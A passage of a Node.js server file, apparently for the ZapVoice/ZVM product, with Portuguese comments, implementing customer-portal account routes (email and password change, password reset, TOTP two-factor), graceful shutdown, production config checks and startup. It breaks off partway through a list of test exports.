        !/^[a-z0-9_-]{1,64}$/i.test(requestedKeyCode)) {
      // Formularios antigos por indice nao podem excluir um numero diferente
      // depois de uma reorganizacao. Recarregar e repetir e mais seguro.
      res.writeHead(303, { Location: '/cliente?device=refresh' }); res.end(); return;
    }
    try {
      const db = await getMongoDb();
      const user = await db.collection('portal_users').findOne({ _id: sess.email });
      if (!user?.keyCode) { res.writeHead(302, { Location: '/cliente' }); res.end(); return; }
      if (user.keyCode !== requestedKeyCode) {
        res.writeHead(303, { Location: '/cliente?device=changed' }); res.end(); return;
      }
      // Escolher o telefone na fonte canônica; a versão in-memory pode ser
      // anterior a uma renovação, bloqueio ou remoção feita pelo administrador.
      const snapshot = await readAdminKeySnapshot(user.keyCode, { db });
      if (!snapshot) { res.writeHead(302, { Location: '/cliente' }); res.end(); return; }
      const phone = Array.isArray(snapshot.phones)
        ? (snapshot.phones.find(storedPhone => storedPhone === requestedPhone) || null) : null;
      if (!phone) {
        res.writeHead(303, { Location: '/cliente?device=changed' }); res.end(); return;
      }
      await mutateAdminKeyRecordStrict(user.keyCode, draft => {
        if (!Array.isArray(draft.phones) || !draft.phones.includes(phone)) {
          const e = new Error('device_changed'); e.code = 'device_changed'; throw e;
        }
        removePhoneFromKey(draft, phone);
      }, { db });
      res.writeHead(303, { Location: '/cliente?ok=1' }); res.end(); return;
    } catch (e) {
      if (e?.code === 'device_changed' || e?.code === 'key_write_conflict') {
        res.writeHead(303, { Location: '/cliente?device=changed' }); res.end(); return;
      }
      console.error('[Portal] remoção de dispositivo:', e.message);
      sendJson(res, { error: 'temporarily_unavailable' }, 503); return;
    }
  }

  if (p === '/cliente/email') {
    if (!isPortalSession(req)) { res.writeHead(302, { Location: '/cliente' }); res.end(); return; }
    if (req.method === 'GET') { sendAuthHtml(res, renderStandalonePortalChangeEmail('', '', getPortalUser(req))); return; }
    if (req.method === 'POST') {
      if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
      const sess = getPortalUser(req);
      const form = await parseFormBody(req);
      const newemail  = (form.get('newemail')||'').toLowerCase().trim().slice(0,120);
      const newemail2 = (form.get('newemail2')||'').toLowerCase().trim().slice(0,120);
      const pass = (form.get('pass')||'').slice(0,128);
      if (!newemail || !newemail2 || !pass) { sendAuthHtml(res, renderStandalonePortalChangeEmail('Preencha todos os campos.', '', sess)); return; }
      if (newemail !== newemail2) { sendAuthHtml(res, renderStandalonePortalChangeEmail('Os e-mails não coincidem.', '', sess)); return; }
      if (newemail === sess.email) { sendAuthHtml(res, renderStandalonePortalChangeEmail('O novo e-mail é igual ao atual.', '', sess)); return; }
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(newemail)) { sendAuthHtml(res, renderStandalonePortalChangeEmail('E-mail inválido.', '', sess)); return; }
      try {
        const db = await getMongoDb();
        const user = await db.collection('portal_users').findOne({ _id: sess.email });
        if (!user) { sendAuthHtml(res, renderStandalonePortalChangeEmail('Sessão inválida. Faça login novamente.', '', sess)); return; }
        const passOk = await verifyPortalPassword(pass, user);
        if (!passOk) { sendAuthHtml(res, renderStandalonePortalChangeEmail('Senha incorreta.', '', sess)); return; }
        const exists = await db.collection('portal_users').findOne({ _id: newemail });
        if (exists) { sendAuthHtml(res, renderStandalonePortalChangeEmail('Este e-mail já está cadastrado.', '', sess)); return; }
        const operationId = crypto.randomBytes(16).toString('hex');
        const claimed = await claimPortalEmailChange(db, sess.email, { operationId, targetEmail: newemail, startedAt: new Date() });
        if (!claimed) { sendAuthHtml(res, renderStandalonePortalChangeEmail('Uma alteração de e-mail já está em andamento. Tente novamente.', '', sess)); return; }
        let targetCreated = false;
        try {
          const newUser = preparePortalUserForEmailChange(user, sess.email, newemail);
          await db.collection('portal_users').insertOne(newUser);
          targetCreated = true;
          const finalized = await finalizePortalEmailChange(db, sess.email, operationId);
          if (!finalized) {
            await db.collection('portal_users').deleteOne({ _id: newemail }).catch(()=>{});
            await releasePortalEmailChange(db, sess.email, operationId).catch(()=>{});
            sendAuthHtml(res, renderStandalonePortalChangeEmail('Erro temporário. Tente novamente.', '', sess)); return;
          }
        } catch (moveErr) {
          if (targetCreated) await db.collection('portal_users').deleteOne({ _id: newemail }).catch(()=>{});
          await releasePortalEmailChange(db, sess.email, operationId).catch(()=>{});
          if (moveErr?.code === 11000) {
            sendAuthHtml(res, renderStandalonePortalChangeEmail('Este e-mail já está cadastrado.', '', sess)); return;
          }
          throw moveErr;
        }
        // Uma troca de identidade revoga todas as sessões da conta antiga.
        revokePortalSessions(sess.email);
        clearSessionCookie(res, 'zv_portal');
        res.writeHead(302, { Location: '/cliente/login?msg=email_changed' }); res.end(); return;
      } catch(e) { console.error('[Portal] email change:', e.message); sendAuthHtml(res, renderStandalonePortalChangeEmail('Erro interno. Tente novamente.', '', sess)); return; }
    }
  }

  if (p === '/cliente/senha') {
    if (!isPortalSession(req)) { res.writeHead(302, { Location: '/cliente' }); res.end(); return; }
    if (req.method === 'GET') { const _ok=url.searchParams.get('ok'); sendAuthHtml(res, renderStandalonePortalChangePwd(_ok?'':'',_ok?'Senha alterada com sucesso!':'', getPortalUser(req))); return; }
    if (req.method === 'POST') {
      if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
      const sess = getPortalUser(req);
      const form = await parseFormBody(req);
      const old  = (form.get('old')||'').slice(0,128);
      const pass = (form.get('pass')||'').slice(0,128);
      const pass2= (form.get('pass2')||'').slice(0,128);
      if (pass.length < 8) { sendAuthHtml(res, renderStandalonePortalChangePwd('Nova senha: mínimo 8 caracteres.', '', sess)); return; }
      if (pass !== pass2) { sendAuthHtml(res, renderStandalonePortalChangePwd('As senhas não coincidem.', '', sess)); return; }
      try {
        const db = await getMongoDb();
        const user = await db.collection('portal_users').findOne({ _id: sess.email });
        if (!user) { sendAuthHtml(res, renderStandalonePortalChangePwd('Sessão inválida.', '', sess)); return; }
        const oldOk = await verifyPortalPassword(old, user);
        if (!oldOk) { sendAuthHtml(res, renderStandalonePortalChangePwd('Senha atual incorreta.', '', sess)); return; }
        const newPass = await hashNewPortalPassword(pass);
        await db.collection('portal_users').updateOne({ _id: sess.email }, { $set: newPass });
        // Mantem a sessao atual, revoga as demais (dispositivos/invasores antigos).
        revokePortalSessions(sess.email, ((req.headers.cookie||'').match(/zv_portal=([a-f0-9]+)/)||[])[1]);
        res.writeHead(302, { Location: '/cliente/senha?ok=1' }); res.end(); return;
      } catch(e) { sendAuthHtml(res, renderStandalonePortalChangePwd('Erro ao alterar senha.', '', sess)); return; }
    }
  }
  // ── Recuperação de senha ──────────────────────────────────
  if (p === '/cliente/recuperar') {
    if (req.method === 'GET') { sendAuthHtml(res, renderStandalonePortalResetRequest()); return; }
    if (req.method === 'POST') {
      if (!checkRateLimit(ip, 'reset')) { sendAuthHtml(res, renderStandalonePortalResetRequest('Muitas tentativas. Aguarde 30 minutos.'), 429); return; }
      const form  = await parseFormBody(req);
      const email = (form.get('email')||'').toLowerCase().trim().slice(0,100);
      if (!email) { sendAuthHtml(res, renderStandalonePortalResetRequest('Informe seu e-mail.')); return; }
      const okMsg = RESEND_API_KEY
        ? 'Se este e-mail estiver cadastrado, você receberá o link de recuperação em instantes. Verifique também o spam.'
        : 'Se este e-mail estiver cadastrado, um link de recuperação foi gerado. Entre em contato com o suporte via WhatsApp para recebê-lo.';
      try {
        const db   = await getMongoDb();
        const user = await db.collection('portal_users').findOne({ _id: email });
        if (user) {
          const rawToken  = generateToken();
          const tokenHash = hashResetToken(rawToken);
          const expiresAt = new Date(Date.now() + 60 * 60 * 1000);
          await db.collection('password_resets').deleteMany({ email });
          // _id é o HASH, nunca o token utilizável — ver hashResetToken().
          await db.collection('password_resets').insertOne({ _id: tokenHash, email, expiresAt });
          const resetUrl = BASE_URL + '/cliente/redefinir?token=' + rawToken;
          // NUNCA logar resetUrl: o token troca a senha da conta. Logs vão para
          // agregadores/terceiros e viram um caminho direto de account takeover.
          // E-mail mascarado (maskEmail) — o log serve pra correlacionar
          // incidentes, não precisa do endereço completo em claro.
          console.log('[Portal] Reset token gerado para', maskEmail(email));
          if (RESEND_API_KEY) {
            const sent = await sendPasswordResetEmail(email, resetUrl);
            if (!sent) console.warn('[Portal] Falha ao enviar email de reset para', maskEmail(email));
          }
        }
        sendAuthHtml(res, renderStandalonePortalResetRequest('', okMsg)); return;
      } catch(e) { console.error('[Portal] reset:', e.message); sendAuthHtml(res, renderStandalonePortalResetRequest('Erro temporário.')); return; }
    }
  }

  if (p === '/cliente/redefinir') {
    const token = (url.searchParams.get('token')||'').replace(/[^a-f0-9]/g,'').slice(0,64);
    if (req.method === 'GET') {
      if (!token) { res.writeHead(302, { Location: '/cliente/recuperar' }); res.end(); return; }
      sendAuthHtml(res, renderStandalonePortalResetForm('', '', token)); return;
    }
    if (req.method === 'POST') {
      const form  = await parseFormBody(req);
      const tk    = (form.get('token')||'').replace(/[^a-f0-9]/g,'').slice(0,64);
      const pass  = (form.get('pass')||'').slice(0,128);
      const pass2 = (form.get('pass2')||'').slice(0,128);
      if (pass.length < 8) { sendAuthHtml(res, renderStandalonePortalResetForm('Senha: mínimo 8 caracteres.', '', tk)); return; }
      if (pass !== pass2)  { sendAuthHtml(res, renderStandalonePortalResetForm('As senhas não coincidem.', '', tk)); return; }
      try {
        const db      = await getMongoDb();
        const { rec, matchedId } = await claimResetToken(db, tk, new Date());
        if (!rec) { sendAuthHtml(res, renderStandalonePortalResetForm('Link expirado ou inválido. Solicite um novo.', '', '')); return; }
        const newPass = await hashNewPortalPassword(pass);
        await db.collection('portal_users').updateOne({ _id: rec.email }, { $set: newPass });
        // Reset de senha expulsa todas as sessoes existentes da conta.
        revokePortalSessions(rec.email);
        // Após o claim atômico, removemos o registro consumido. O consumedAt
        // impede uma segunda requisição concorrente de avançar antes daqui.
        await db.collection('password_resets').deleteOne({ _id: matchedId });
        sendAuthHtml(res, renderStandalonePortalResetForm('', 'Senha redefinida com sucesso!', '')); return;
      } catch(e) { sendAuthHtml(res, renderStandalonePortalResetForm('Erro temporário.', '', tk)); return; }
    }
  }

  // ── 2FA portal (standalone — mesmo contrato, view renderStandalone*2FA*) ──
  if (p === '/cliente/2fa/verificar') {
    const sess = getPortalUser(req);
    if (!sess || !sess.pending2fa) { res.writeHead(302, { Location: '/cliente' }); res.end(); return; }
    if (req.method === 'GET') { sendAuthHtml(res, renderStandalone2FAVerify()); return; }
    if (req.method === 'POST') {
      if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
      if (!checkRateLimit(ip, 'twofa')) { sendAuthHtml(res, renderStandalone2FAVerify('Muitas tentativas. Aguarde 10 minutos.'), 429); return; }
      const form = await parseFormBody(req);
      const code = (form.get('code')||'').trim();
      try {
        const db   = await getMongoDb();
        let user = await db.collection('portal_users').findOne({ _id: sess.email });
        let activeSecret = '';
        try { activeSecret = portalTotpReadSecret(user, sess.email); }
        catch (_) { sendAuthHtml(res, renderStandalone2FAVerify('2FA temporariamente indisponível. Tente novamente.')); return; }
        if (!user || !activeSecret || !verifyTOTP(activeSecret, code)) { addSecurityAlert('BRUTE_FORCE', '2FA falhou para ' + maskEmail(sess.email), ip); sendAuthHtml(res, renderStandalone2FAVerify('Código inválido. Tente novamente.')); return; }
        if (user.totpSecret && !user.totpSecretEnc) user = await migratePortalTotpLegacy(db, user, sess.email);
        const m = (req.headers.cookie||'').match(/zv_portal=([a-f0-9]+)/);
        if (m) portalSessions[m[1]] = { email: sess.email, name: sess.name, expiresAt: new Date(Date.now()+24*60*60*1000).toISOString() };
        setSessionCookie(res, 'zv_portal', m[1], 86400);
        const dest = sess.redir && sess.redir.startsWith('/') ? sess.redir : '/cliente';
        res.writeHead(302, { Location: dest }); res.end();
      } catch(e) { sendAuthHtml(res, renderStandalone2FAVerify('Erro temporário.')); return; }
      return;
    }
  }

  if (p === '/cliente/2fa/setup') {
    if (!isPortalSession(req)) { res.writeHead(302, { Location: '/cliente' }); res.end(); return; }
    const sess = getPortalUser(req);
    try {
      const db   = await getMongoDb();
      let user = await db.collection('portal_users').findOne({ _id: sess.email });
      if (user) user = await migratePortalTotpLegacy(db, user, sess.email);
      const _2faOk=url.searchParams.get('ok'); if (portalTotpHasSecret(user)) { sendAuthHtml(res, renderStandaloneSetup2FA(user, '', '', _2faOk?'2FA ativado com sucesso! Sua conta está protegida.':'')); return; }
      let pending = user && user.pendingTotpExpiresAt && new Date() < new Date(user.pendingTotpExpiresAt)
        ? portalTotpReadPendingSecret(user, sess.email) : null;
      if (!pending) {
        pending = genTotpSecret();
        await db.collection('portal_users').updateOne({ _id: sess.email }, { $set: { pendingTotpSecretEnc: portalTotpEncrypt(pending, sess.email), pendingTotpExpiresAt: new Date(Date.now() + 15 * 60000) }, $unset: { pendingTotpSecret: '' } });
      }
      sendAuthHtml(res, renderStandaloneSetup2FA(user, pending, '', '')); return;
    } catch(e) { sendAuthHtml(res, renderStandaloneSetup2FA(null, '', 'Erro ao carregar configuração.', '')); return; }
  }

  if (p === '/cliente/2fa/ativar' && req.method === 'POST') {
    if (!isPortalSession(req)) { res.writeHead(302, { Location: '/cliente' }); res.end(); return; }
    if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
    if (!checkRateLimit(ip, 'twofa')) { sendAuthHtml(res, renderStandaloneSetup2FA(null, '', 'Muitas tentativas. Aguarde 10 minutos.', ''), 429); return; }
    const sess = getPortalUser(req);
    const form = await parseFormBody(req);
    const code = (form.get('code')||'').trim();
    try {
      const db   = await getMongoDb();
      let user = await db.collection('portal_users').findOne({ _id: sess.email });
      if (user) user = await migratePortalTotpLegacy(db, user, sess.email);
      const pending = user && user.pendingTotpExpiresAt && new Date() < new Date(user.pendingTotpExpiresAt)
        ? portalTotpReadPendingSecret(user, sess.email) : null;
      if (!pending) { sendAuthHtml(res, renderStandaloneSetup2FA(user, '', 'Sessão expirada. Tente novamente.', '')); return; }
      if (!verifyTOTP(pending, code)) { sendAuthHtml(res, renderStandaloneSetup2FA(user, pending, 'Código inválido. Tente novamente.', '')); return; }
      await db.collection('portal_users').updateOne({ _id: sess.email }, { $set: portalTotpActiveFields(pending, sess.email), $unset: { pendingTotpSecret: '', pendingTotpSecretEnc: '', pendingTotpExpiresAt: '' } });
      const updated = await db.collection('portal_users').findOne({ _id: sess.email });
      res.writeHead(302, { Location: '/cliente/2fa/setup?ok=ativado' }); res.end(); return;
    } catch(e) { sendAuthHtml(res, renderStandaloneSetup2FA(null, '', 'Erro ao ativar 2FA.', '')); return; }
  }

  if (p === '/cliente/2fa/desativar' && req.method === 'POST') {
    if (!isPortalSession(req)) { res.writeHead(302, { Location: '/cliente' }); res.end(); return; }
    if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
    if (!checkRateLimit(ip, 'twofa')) { sendAuthHtml(res, renderStandaloneSetup2FA(null, '', 'Muitas tentativas. Aguarde.', ''), 429); return; }
    const sess = getPortalUser(req);
    const form = await parseFormBody(req);
    const code = (form.get('code')||'').trim();
    try {
      const db   = await getMongoDb();
      let user = await db.collection('portal_users').findOne({ _id: sess.email });
      if (user) user = await migratePortalTotpLegacy(db, user, sess.email);
      let activeSecret = '';
      try { activeSecret = portalTotpReadSecret(user, sess.email); } catch (_) {}
      if (!user || !activeSecret || !verifyTOTP(activeSecret, code)) { sendAuthHtml(res, renderStandaloneSetup2FA(user, '', 'Código 2FA inválido.', '')); return; }
      await db.collection('portal_users').updateOne({ _id: sess.email }, { $unset: { totpSecret: '', totpSecretEnc: '', pendingTotpSecret: '', pendingTotpSecretEnc: '', pendingTotpExpiresAt: '' } });
      res.writeHead(302, { Location: '/cliente?ok=2fa_off' }); res.end(); return;
    } catch(e) { sendAuthHtml(res, renderStandaloneSetup2FA(null, '', 'Erro ao desativar 2FA.', '')); return; }
  }

  // ══════════════ fim portal do cliente ══════════════════════

  // Rota não encontrada: navegação real de navegador (Accept: text/html)
  // recebe a página 404 do standalone; qualquer outra coisa (extensão,
  // scripts, fetch de API) mantém o JSON de sempre — contrato preservado.
  if (req.method === 'GET' && (req.headers.accept || '').includes('text/html')) {
    const _sess404 = isPortalSession(req) ? getPortalUser(req) : null;
    sendPublicHtml(res, renderStandalone404Page(_sess404), 404);
    return;
  }
  sendJson(res, { error: 'not_found' }, 404);
}

async function gracefulShutdown(signal, exitCode = 0) {
  console.log(`[${signal}] Encerrando servidor graciosamente...`);

  // 1. Para o timer de keep-alive para não criar conexões novas durante o dreno
  if (_pingInterval) { clearInterval(_pingInterval); _pingInterval = null; }
  if (_caktoWorkerTimer) { clearInterval(_caktoWorkerTimer); _caktoWorkerTimer = null; }
  if (_caktoRecoveryTimer) { clearInterval(_caktoRecoveryTimer); _caktoRecoveryTimer = null; }
  if (_caktoRecoveryStartupTimer) { clearTimeout(_caktoRecoveryStartupTimer); _caktoRecoveryStartupTimer = null; }

  // 2. Janela de segurança: força saída após 8s caso o dreno trave
  const forceExit = setTimeout(() => {
    console.error('[SHUTDOWN] Timeout de 8s — saída forçada');
    process.exit(1);
  }, 8_000).unref();

  // 3. Para de aceitar novas conexões, encerra keep-alives ociosos e deixa
  // requests em andamento concluírem dentro da janela de segurança acima.
  // Não usamos closeAllConnections() aqui: isso derrubaria transações ativas
  // (por exemplo um webhook já autenticado) no meio de um deploy do Render.
  if (_httpServer) {
    await new Promise(resolve => {
      _httpServer.close(resolve);
      _httpServer.closeIdleConnections?.();
    });
    console.log('[SHUTDOWN] HTTP server drenado');
  }

  // 4. Aguarda o worker financeiro ativo concluir ou devolver o evento à fila
  //    antes de fechar o Mongo. A janela é limitada pelo timeout global acima.
  if (_caktoWorkerPromise) {
    await Promise.race([_caktoWorkerPromise, new Promise(resolve => setTimeout(resolve, 5000))]);
  }

  // 5. Descarrega gravações pendentes (debounce) ANTES de fechar o Mongo.
  try { await flushPendingSaves(); } catch(e) { console.error('[SHUTDOWN] Erro ao gravar pendências:', e.message); }

  // 6. Fecha pool do MongoDB — somente após HTTP/worker drenarem e pendências gravarem
  try {
    if (_mongoClient) { await _mongoClient.close(); console.log('[SHUTDOWN] MongoDB desconectado'); }
  } catch(e) { console.error('[SHUTDOWN] Erro ao fechar MongoDB:', e.message); }

  clearTimeout(forceExit);
  process.exit(exitCode);
}
function validateProductionSecurityConfig() {
  const authorityState = {
    ...ZVM_BUILD_AUTHORITY.describe(),
    extensionIdCount: ZVM_EXTENSION_IDS.size,
    devKeyHashCount: ZVM_DEV_BUILD_KEY_HASHES.size,
    devDeviceHashCount: ZVM_DEV_BUILD_DEVICE_HASHES.size,
    registryV2Error: !!ZVM_BUILD_REGISTRY_V2_ERROR,
    devSignedBuildsAllow: ZVM_DEV_SIGNED_BUILDS_ALLOW,
    devSigningKeyCount: ZVM_DEV_SIGNING_CONFIG.publicKeys.size,
    devSigningConfigured: ZVM_DEV_SIGNING_CONFIG.enabled === true && !ZVM_DEV_SIGNING_CONFIG_ERROR,
  };
  const runtimeState = validateRuntimeSecurityConfig(process.env, authorityState, {
    productionDbName: 'zapvoice',
    requiredCrypto: [
      {
        enabled: ZVM_RUNTIME_ENV === 'production',
        configured: portalTotpKeyRing().length > 0,
        code: 'PORTAL_TOTP_CRYPTO_UNAVAILABLE',
      },
    ],
  });

  if (runtimeState.runtimeEnv !== 'production') {
    return { ...runtimeState, production: false, legacyV3: legacyV3Allowed() };
  }

  const errors = [];
  if (Buffer.byteLength(String(APP_SECRET || ''), 'utf8') < 32) errors.push('APP_SECRET_too_weak');
  if (PORTAL_TOTP_ENCRYPTION_KEY && !_portalTotpDecodeKey(PORTAL_TOTP_ENCRYPTION_KEY)) errors.push('PORTAL_TOTP_ENCRYPTION_KEY_invalid');
  if (WEBHOOK_URL && !parseSafeWebhookUrl(WEBHOOK_URL)) errors.push('WEBHOOK_URL_https_required');
  if (CAKTO_WEBHOOK_SECRET && Buffer.byteLength(String(CAKTO_WEBHOOK_SECRET), 'utf8') < 32) errors.push('CAKTO_WEBHOOK_SECRET_too_weak');
  if (CAKTO_WEBHOOK_SECRET) {
    const effectiveRecoverySecret = CAKTO_RECOVERY_SECRET || APP_SECRET;
    if (Buffer.byteLength(String(effectiveRecoverySecret || ''), 'utf8') < 32) errors.push('CAKTO_RECOVERY_SECRET_required_or_too_weak');
    for (const previous of String(CAKTO_RECOVERY_SECRET_PREVIOUS || '').split(',').map(v => v.trim()).filter(Boolean)) {
      if (Buffer.byteLength(previous, 'utf8') < 32) errors.push('CAKTO_RECOVERY_SECRET_PREVIOUS_too_weak');
    }
  }
  if (errors.length) {
    const error = new Error(`PRODUCTION_SECURITY_CONFIG_INVALID:${errors.join(',')}`);
    error.code = 'PRODUCTION_SECURITY_CONFIG_INVALID';
    error.problems = errors;
    throw error;
  }
  return {
    ...runtimeState,
    production: true,
    legacyV3: legacyV3Allowed(),
    registryV2ActiveCount: authorityState.registryV2ActiveCount,
  };
}


if (require.main === module) {
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT',  () => gracefulShutdown('SIGINT'));
(async () => {
  try {
    validateProductionSecurityConfig();
    const loaded = await loadDb();
    keys           = loaded.keys || {};
    logs           = loaded.logs || [];
    securityAlerts = loaded.securityAlerts || []; // restaura histórico persistido para a aba Segurança/Auditoria
    for (const code of Object.keys(keys)) sanitizeKeyRecord(keys[code]);
    serverReady = true;
    startCaktoWorker();

    const buildAuthorityState = ZVM_BUILD_AUTHORITY.describe();
    console.log(
      `✅ ZVM Server ${ZVM_BUILD_ID} — porta ${PORT}\n` +
      `🍃 MongoDB: zapvoice.store | Chaves: ${Object.keys(keys).length} | Logs: ${logs.length}\n` +
      `🔐 HMAC: ${APP_SECRET ? 'ATIVO' : '⚠ INATIVO'} | 2FA: ${TOTP_SECRET ? 'ATIVO' : '⚠ INATIVO'} | TOTP crypto: ${portalTotpCryptoMode()} | Cakto: ${CAKTO_WEBHOOK_SECRET ? 'ATIVO' : '⚠ INATIVO'}\n` +
      `🛡️ Runtime: ${buildAuthorityState.runtimeEnv || 'não definido'} | Build Authority: ${buildAuthorityState.buildEnforce ? 'ATIVO' : 'DESATIVADO'} | Registry V2 active: ${buildAuthorityState.registryV2ActiveCount} | DEV bypass: ${buildAuthorityState.devBuildAllow ? 'ATIVO' : 'INATIVO'} | DEV cohost: ${buildAuthorityState.devCohostAllow ? 'ATIVO' : 'INATIVO'} | Legacy V3: ${buildAuthorityState.legacyV3 ? 'ATIVO' : 'INATIVO'} | Legacy V3 endpoints: ${legacyV3Allowed() ? 'ATIVOS (Build 3 unpacked: key/check-status/usage/get-usage/sync-usage)' : 'INATIVOS'}\n` +
      `🧪 Local safe mode: ${ZVM_LOCAL_SAFE_MODE ? 'ATIVO — jobs autônomos desativados' : 'INATIVO'}\n` +
      // Rota admin derivada + usuário administrativo NÃO vão pro log de boot:
      // quem operou já tem essas duas informações a partir das próprias env
      // vars (APP_SECRET/ADMIN_USER) — reimprimi-las só cria mais um lugar
      // (agregador de log, dashboard do host) onde um segredo pode vazar.
      `🔑 Admin ZVM: configurado (rota derivada de APP_SECRET)\n` +
      `📊 Analytics: ${ANALYTICS_PASS ? 'ATIVO' : '⚠ INATIVO'} | Extension: ${R_EXT}/v3/key | Webhook: ${WEBHOOK_URL ? (parseSafeWebhookUrl(WEBHOOK_URL) ? 'ATIVO' : '⚠ URL RECUSADA') : 'não configurado'}\n` +
      `🗂  Logs: retenção ${LOG_RETENTION_DAYS}d (LGPD) | máx ${LOG_MAX} em memória`
    );

    if (META_APP_ID || META_APP_SECRET || META_CONFIG_ID || META_TOKEN_ENCRYPTION_KEY || META_WEBHOOK_VERIFY_TOKEN) {
      if (!metaConfigured()) console.warn('[META] Configuração incompleta — Embedded Signup permanecerá fail-closed.');
      if (!META_WEBHOOK_VERIFY_TOKEN) console.warn('[META] META_WEBHOOK_VERIFY_TOKEN ausente — verificação de webhook ficará indisponível.');
    }

    const safeHandler = (req, res) => {
      applyRequestContext(req, res);
      observeHttpTraffic(req, res);
      handleRequest(req, res).catch(err => {
        console.error(`[ERRO][rid=${req.zvmRequestId || 'n/a'}] ${req.method} ${req.url.split('?')[0]}:`, err.message||err);
        if (res.headersSent) return;
        // Navegação real de navegador ganha a página de indisponibilidade
        // temporária do standalone; APIs continuam com resposta textual.
        const _path = (req.url || '').split('?')[0];
        const _isHtmlNav = req.method === 'GET' && (req.headers.accept || '').includes('text/html');
        if (_isHtmlNav) {
          try { sendPublicHtml(res, renderStandalone500Page(), 500); return; } catch (_) { /* fallback abaixo */ }
        }
        res.writeHead(500); res.end('Internal Server Error');
      });
    };

    const _trafficSummaryTimer = setInterval(() => {
      const snap = httpTrafficSnapshot(15);
      console.log('[TRAFFIC] ' + JSON.stringify({ windowMinutes: snap.windowMinutes, totalRequests: snap.totalRequests, top: snap.rows.slice(0, 8) }));
    }, 15 * 60 * 1000);
    _trafficSummaryTimer.unref();

    let _fatalShutdownStarted = false;
    const fatalShutdown = (kind, err) => {
      console.error(`[${kind}]`, err && (err.stack || err.message) || err);
      if (_fatalShutdownStarted) return;
      _fatalShutdownStarted = true;
      gracefulShutdown(kind, 1).catch(() => process.exit(1));
    };
    process.on('uncaughtException',  err => fatalShutdown('uncaughtException', err));
    process.on('unhandledRejection', err => fatalShutdown('unhandledRejection', err));

    const server = http.createServer({ maxHeaderSize: 16 * 1024 }, safeHandler);
    server.requestTimeout   = 30000;
    server.headersTimeout   = 30000;
    server.keepAliveTimeout = 65000; // acima dos 60s do LB do Render
    server.maxHeadersCount  = 100;
    server.maxRequestsPerSocket = 1000;
    _httpServer = server;
    // Erro amigável quando a porta já está em uso (evita stack trace confuso de EADDRINUSE)
    server.on('error', (err) => {
      if (err.code === 'EADDRINUSE') {
        console.error(`\n❌ A porta ${PORT} já está sendo usada por outro programa.`);
        console.error(`   Feche o outro servidor OU rode este em outra porta, ex.:`);
        console.error(`   set PORT=3001 && node server.js   (Windows CMD)`);
        console.error(`   $env:PORT=3001; node server.js    (PowerShell)\n`);
      } else {
        console.error('❌ Erro no servidor HTTP:', err.message);
      }
      process.exit(1);
    });
    server.listen(PORT, () => {
      console.log(`🚀 Servidor ouvindo na porta ${PORT}`);
      _pingInterval = setInterval(() => {
        const req = http.request(
          { hostname: '127.0.0.1', port: PORT, path: '/health', method: 'GET' },
          res => { res.resume(); }
        );
        req.on('error', () => {});
        req.end();
      }, 8 * 60 * 1000);
      _pingInterval.unref(); // Não bloqueia event loop no shutdown
    });
  } catch (e) {
    console.error('❌ Falha ao iniciar:', sanitizeStartupErrorMessage(e));
    process.exit(1);
  }
})();
}

module.exports.__test = Object.freeze({
  sanitizeStartupErrorMessage,
  keys,
  readPortalKeySnapshot,
  readAdminKeysSnapshot,
  readAdminKeySnapshot,
  getKeyStats,
  renderAdminDashboard,
  loadDb,
  _writeKeyToDbStrict,
  commitAdminKeyRecordStrict,
  mutateAdminKeyRecordStrict,
  setAdminKeyDevAccessStrict,
  deleteKeyFromDb,
  deleteKeysFromDbStrict,
  portalTotpKeyRing,
  portalTotpDedicatedKeyValid,
  portalTotpCryptoMode,
  portalTotpEncrypt,
  portalTotpDecrypt,
  portalTotpHasSecret,
  portalTotpActiveFields,
  PORTAL_TOTP_ENCRYPTED_SENTINEL,
  portalTotpReadSecret,
  portalTotpReadPendingSecret,
  migratePortalTotpLegacy,
  caktoDryRunAllowed,
  parseSafeWebhookUrl,
  ZVM_PLANS,
  ZVM_PUBLIC_PLANS,
  ZVM_PAYMENT_PLANS,
  normalizeCaktoPurchase,
  normalizeCaktoPurchases,
  isCaktoPaidEntitlementEvent,
  selectCaktoCommercialPurchase,
  normalizeCheckoutUrl,
  resolveCaktoPlan,
  validateCaktoPayload,
  verifyCaktoSignature,
  validateCaktoCommercialIntegrity,
  maskTransactionId,
  caktoEventKey,
  caktoQueueRef,
  compactCaktoPurchaseForQueue,
  encryptCaktoQueuePurchase,
  decryptCaktoQueuePurchase,
  migrateCaktoQueuedPurchaseDocument,
  backfillCaktoQueuePayloads,
  caktoPaymentTxKey,
  backfillCaktoPaymentTxKeys,
  backfillCaktoQueueRefs,
  reconcileCaktoQueueCounter,
  reserveCaktoQueueSlot,
  releaseCaktoQueueSlot,
  assertCaktoQueueTransactionReady,
  runCaktoQueueAtomic,
  encryptCaktoRecoveryPayload,
  decryptCaktoRecoveryPayload,
  caktoMailRef,
  caktoDurableMailEnabled,
  encryptCaktoMailPayload,
  decryptCaktoMailPayload,
  caktoMailRetentionDate,
  ensureCaktoDeliveryOutbox,
  claimNextCaktoMailOutbox,
  caktoMailLeaseFilter,
  markCaktoMailFailure,
  processCaktoMailOutboxItem,
  attemptCaktoMailByRef,
  getCaktoMailHealth,
  requeueCaktoMail,
  classifyCaktoQueueFailure,
  caktoQueueFailureRef,
  caktoExpiredProcessingFilter,
  caktoRunnableQueueFilter,
  recoverCaktoDuplicateEvent,
  enqueueCaktoPurchaseEvent,
  acquireCaktoWorkerLeaseToken,
  acquireCaktoWorkerLease,
  renewCaktoWorkerLease,
  releaseCaktoWorkerLease,
  claimNextCaktoQueuedEvent,
  caktoEventLeaseFilter,
  caktoRetryDelayMs,
  caktoRetentionDate,
  getCaktoQueueHealth,
  CAKTO_QUEUE_MAX_ACTIVE,
  CAKTO_MAIL_MAX_ATTEMPTS,
  CAKTO_MAIL_BATCH,
  WORKER_LOCK_RETENTION_MS,
  markCaktoQueueFailure,
  processCaktoQueuedEvent,
  runCaktoWorkerOnce,
  requeueCaktoEvent,
  commercialTxNamespace,
  commercialTxClaimId,
  commercialTxIdentityHash,
  commercialTxClaimExpiry,
  commercialOrderKeyForSale,
  acquireCommercialTxClaim,
  renewCommercialTxClaim,
  completeCommercialTxClaim,
